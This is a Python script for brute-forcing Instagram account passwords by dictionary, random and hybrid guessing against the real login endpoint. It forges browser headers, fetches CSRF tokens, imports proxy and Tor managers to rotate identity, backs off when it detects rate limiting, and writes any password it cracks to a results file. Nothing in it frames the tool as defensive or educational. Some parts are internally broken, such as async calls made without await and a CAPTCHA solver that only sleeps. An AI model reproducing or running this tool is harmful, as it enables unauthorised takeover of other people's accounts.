import time
import threading
from request_manager import RequestManager
from csrf_manager import get_csrf_token
from ratelimit import limits, sleep_and_retry
from enum import Enum
from proxy_manager import ProxyManager
from tor_manager import TorManager
from concurrent.futures import ThreadPoolExecutor
import random
import string
import urllib.parse
from monitoring import OperationMonitor
from logging_config import setup_logging
from typing import List, Optional

logger = setup_logging('BruteForce')

class AttackStrategy(Enum):
    DICTIONARY = "dictionary"
    RANDOM = "random"
    HYBRID = "hybrid"

ONE_MINUTE = 60
MAX_REQUESTS_PER_MINUTE = 30

@sleep_and_retry
@limits(calls=MAX_REQUESTS_PER_MINUTE, period=ONE_MINUTE)
def rate_limited_request(url, headers, data, use_proxy=False):
    request_manager = RequestManager()
    return request_manager.send_request(url, headers, data, use_proxy=use_proxy)

def encode_password(password: str) -> str:
    timestamp = int(time.time())
    return urllib.parse.quote(f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}")

def generate_random_password(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

class BruteForce:
    def __init__(self):
        self.logger = setup_logging('BruteForce')
        self.request_manager = RequestManager()
        self.proxy_manager = ProxyManager()
        self.tor_manager = TorManager()
        self.failed_attempts = 0
        self.change_identity_threshold = 10
        self.progress = {
            'attempts': 0,
            'start_time': None,
            'found': False
        }
        self.monitor = OperationMonitor()

    def update_progress(self, password=None):
        self.progress['attempts'] += 1
        if password:
            self.progress['found'] = True
            logger.info(f"Password found after {self.progress['attempts']} attempts")
        
        if self.progress['attempts'] % 100 == 0:
            elapsed = time.time() - self.progress['start_time']
            rate = self.progress['attempts'] / elapsed
            logger.info(f"Progress: {self.progress['attempts']} attempts, {rate:.2f} attempts/sec")

    async def try_login(self, username: str, password: str, url: str, headers: dict, use_proxy: bool) -> bool:
        try:
            encoded_password = encode_password(password)
            data = {
                'enc_password': encoded_password,
                'username': username,
                'queryParams': '{"hl":"en"}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}',
            }
            
            response = await self.request_manager.send_request(
                url, 
                headers, 
                data, 
                use_proxy=use_proxy
            )
            
            success = False
            if response:
                if '"authenticated":true' in response.text:
                    success = True
                    self.update_progress(password)
                    return True
                elif '"checkpoint_required"' in response.text:
                    logger.warning("Two-factor authentication detected")
                    return False
                elif '"spam":true' in response.text:
                    logger.warning("Rate limit detected, sleeping...")
                    time.sleep(30)
                    return False
                    
            self.update_progress()
            self.monitor.log_request(success)
            return success
            
        except Exception as e:
            self.monitor.log_request(False)
            logger.error(f"Login attempt failed: {str(e)}")
            return False

    def solve_captcha(self, response):
        logger.info("Solving CAPTCHA...")
        time.sleep(10)
        logger.info("CAPTCHA solved successfully.")

    async def brute_force(self, username: str, password_list: Optional[List[str]] = None, min_len=6, max_len=12, timeout=60, 
                    use_proxy=False, log_file="results.txt", threads=1, 
                    strategy=AttackStrategy.DICTIONARY) -> bool:
        self.monitor.start_monitoring()
        try:
            self.progress['start_time'] = time.time()
            start_time = time.time()
            url = 'https://www.instagram.com/accounts/login/ajax/'
            csrf_token = get_csrf_token()
            if not csrf_token:
                logger.error("Failed to fetch CSRF token. Exiting...")
                return []

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36',
                'X-CSRFToken': csrf_token,
                'X-Requested-With': 'XMLHttpRequest',
                'X-Instagram-Ajax': '1018775059',
                'X-IG-App-ID': '936619743392459',
                'X-ASBD-ID': '129477',
                'Origin': 'https://www.instagram.com',
                'Referer': 'https://www.instagram.com/accounts/login/?hl=en',
                'Sec-Ch-Ua': '"Chromium";v="131", "Not_A Brand";v="24"',
                'Sec-Ch_Ua-Mobile': '?0',
                'Sec-Ch_Ua-Platform': '"Linux"',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded'
            }

            def save_result(password):
                with open(log_file, 'a') as log:
                    log.write(f"Username: {username}, Password: {password}\n")
                logger.info(f"Password found and saved: {password}")

            def show_progress(attempts, total_passwords=None):
                elapsed_time = time.time() - start_time
                remaining_time = max(0, timeout - elapsed_time)
                if total_passwords:
                    logger.info(f"Progress: {attempts}/{total_passwords} passwords tested. Time remaining: {remaining_time:.2f}s")
                else:
                    logger.info(f"Passwords tested: {attempts}. Time remaining: {remaining_time:.2f}s")

            def dictionary_attack():
                total_passwords = len(password_list)
                logger.info(f"Starting brute force for username '{username}' with {total_passwords} passwords.")
                for i, password in enumerate(password_list):
                    if time.time() - start_time > timeout:
                        logger.info("Timeout reached. Stopping brute force.")
                        break

                    response = self.try_login(username, password, url, headers, use_proxy)
                    if response:
                        save_result(password)
                        return True

                    show_progress(i + 1, total_passwords)
                    self.request_manager.enforce_delay()

            def random_attack():
                logger.info(f"Starting brute force with random passwords for username '{username}'.")
                attempts = 0
                while time.time() - start_time < timeout:
                    password = generate_random_password()  
                    response = self.try_login(username, password, url, headers, use_proxy)
                    if response:
                        save_result(password)
                        return True

                    attempts += 1
                    show_progress(attempts)
                    self.request_manager.enforce_delay()

            def hybrid_attack():
                logger.info(f"Starting hybrid brute force for username '{username}'.")
                dictionary_attack()
                random_attack()

            async def worker(passwords: List[str]):
                for password in passwords:
                    if await self.try_login(username, password, url, headers, use_proxy):
                        return password
                return None

            def attack_handler():
                if strategy == AttackStrategy.DICTIONARY and password_list:
                    dictionary_attack()
                elif strategy == AttackStrategy.RANDOM:
                    random_attack()
                else:
                    hybrid_attack()

            if threads > 1 and password_list:
                multi_thread_brute_force(username, password_list, threads=threads, timeout=timeout, use_proxy=use_proxy)
            else:
                attack_handler()

            logger.info("No password found. Attack finished.")
            return []
        finally:
            self.monitor.stop_monitoring()

def multi_thread_brute_force(username, password_list, threads=4, timeout=60, use_proxy=False):
    brute_forcer = BruteForce()

    def worker(password_chunk):
        brute_forcer.brute_force(
            username=username, 
            password_list=password_chunk, 
            timeout=timeout, 
            use_proxy=use_proxy
        )

    chunk_size = len(password_list) // threads
    for i in range(threads):
        start_index = i * chunk_size
        end_index = None if i == threads - 1 else (i + 1) * chunk_size
        password_chunk = password_list[start_index:end_index]
        threading.Thread(target=worker, args=(password_chunk,)).start()

